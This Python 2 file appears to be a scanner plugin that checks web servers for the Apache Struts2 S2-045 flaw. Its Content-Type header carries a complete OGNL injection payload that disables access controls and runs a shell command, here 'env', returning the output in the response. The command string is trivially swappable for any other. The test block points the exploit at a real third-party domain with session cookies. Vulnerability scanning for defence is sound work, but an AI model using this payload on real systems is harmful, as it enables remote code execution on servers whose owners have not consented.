#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from lib.common import *
import requests



def run(url, method, data, headers, proxy_headers=None):
    headers = {}
    headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 IQIYI Cloud Security Scanner tp_cloud_security[at]qiyi.com"
    headers['Connection'] = 'Close'
    cmd = 'env'
    headers['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
                             "(#_memberAccess?(#_memberAccess=#dm):" \
                             "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
                             "(#ognlUtil=#container.getInstance" \
                             "(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
                             "(#ognlUtil.getExcludedPackageNames().clear())." \
                             "(#ognlUtil.getExcludedClasses().clear())." \
                             "(#context.setMemberAccess(#dm))))." \
                             "(#cmd='" + \
                             cmd + \
                             "')." \
                             "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase()." \
                             "contains('win')))." \
                             "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
                             "(#p=new java.lang.ProcessBuilder(#cmds))." \
                             "(#p.redirectErrorStream(true)).(#process=#p.start())." \
                             "(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." \
                             "getOutputStream()))." \
                             "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \
                             "(#ros.flush())}"
    data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
           'Content-Disposition: form-data; name="image1"\r\n' \
            'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
    try:
        url = url
        # print url
        #print headers['Content-Type']
        # code, head, html = http_request_post(url, data, headers=headers)
        resp = requests.post(url, data, verify=False, headers=headers, timeout=(4, 20))
        # print code, head, html
        if 'PWD=' in resp.text:
            details = 'Struts2_045 %s' % (url)
            target = url
            return {'target':target, 'type':'Struts2', 'info':details}
    except Exception, e:
        pass

def verify(task):
    message = {
        "method": "",
        "url" : "",
        "param" : "",
        "type" : "struts rce",
        "info" : "",
    }

    url = task['url']
    method = task['method']
    headers = task['request_header']
    data = task['request_content'] if method == 'POST' else None


    result = run(url, method, data, headers)
    if result:
        message['method'] = method
        message['url'] = url
        message['info'] = result['info']
        save_to_databases(message)
        result = (True, message)
    else:
        result = (False, {})
    return result

if __name__ == '__main__':
    task = {
            'url': 'http://fw.jd.com/index.action',
        'request_header': {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-GB,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'http://127.0.0.1:8000/vulnerabilities/exec/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Cookie': 'sessions=%7B%7D; csrftoken=71w812VAMB8nvVNcYgOmwW6ftN8igDyZsqE9FHz2MsGdQpgdmwpl1jzG2iE7YwLZ; sessionid=x4phtuh6qv5zhpcu46v1xlszto8pbib1; PHPSESSID=ktd1uec9ekucj6afr284i5bks6; security=low; hibext_instdsigdipv2=1',
        },
        'request_content': '',
        'method': 'GET'
    }
    print verify(task)
